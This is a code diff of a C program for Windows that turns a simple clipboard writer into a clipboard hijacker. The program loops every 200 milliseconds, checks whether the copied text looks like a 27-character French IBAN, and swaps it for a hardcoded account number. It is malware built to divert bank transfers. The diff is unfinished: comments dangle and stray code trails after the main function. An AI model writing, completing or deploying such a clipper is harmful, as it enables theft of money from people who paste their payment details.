@@ -1,26 +1,40 @@
 #include <stdio.h>
-#include <Windows.h>
+
+#include "./memory/memory.h"
+#include "./clipboard/clipboard.h"
 
 int main() {
-    const char* output = "FRXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
-    const size_t len = strlen(output) + 1;
+    const char * iban = "FRXXXXXXXXXXXXXXXXXXXXXXXXX";
+    const size_t len = strlen(iban) + 1;
+
+    while(1) {
+        Sleep(200);
+        HGLOBAL hMem = getStringHandle(iban, len);
+        // Récupérer la valeur du presse_papier
+        OpenClipboard(0);
+        const char * pastedIban = getLatestClipboardValue();
+        if (strlen(pastedIban) == 27 && pastedIban[0] == 'F' && pastedIban[1] == 'R') {
+        // could be a regex, won't bother :D
+        // 1 && 1 to be replaced by checking strlen for 
+            modifyClipboard(hMem);
+        }
+        GlobalUnlock(GetClipboardData(CF_TEXT));
+        CloseClipboard();
+    }
+    return 0;
+}
 
     //Requires GetSystemInfo for page size and allocation granularity
-    HGLOBAL hMem =  GlobalAlloc(GMEM_MOVEABLE, len); 
-    LPVOID fdfd = VirtualAlloc(NULL, NULL, MEM_COMMIT, );
+    //LPVOID fdfd = VirtualAlloc(NULL, NULL, MEM_COMMIT, );
     //Could be potentially improved using HeapAlloc/VirtualAlloc
     /*
         HGLOBAL is a data structure specifically made for creating a handle
         a handle allows kernel to isolate memory access and give access to data via ids
     */
-    memcpy(GlobalLock(hMem), output, len);
     // virtualLock
-    GlobalUnlock(hMem); // GlobalUnlock ?
+    // GlobalUnlock ?
     // virtualUnlock
 
-    OpenClipboard(0); // 
-    EmptyClipboard(); // 
-    SetClipboardData(CF_TEXT, hMem); // 
-    CloseClipboard(); // 
-    return 0;
-}
+    
+
+
